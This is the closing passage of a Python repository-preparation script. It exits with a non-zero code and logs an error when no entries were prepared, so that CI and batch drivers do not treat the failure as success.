    # Exit non-zero when nothing was prepared so batch drivers / CI keying on the
    # exit code don't treat a total prepare failure as success (parity with the
    # other prepare_repo_*.py scripts).
    if not entries:
        logger.error("Prepared 0 entries — nothing to build. Exiting non-zero.")
        sys.exit(1)


if __name__ == "__main__":
    main()
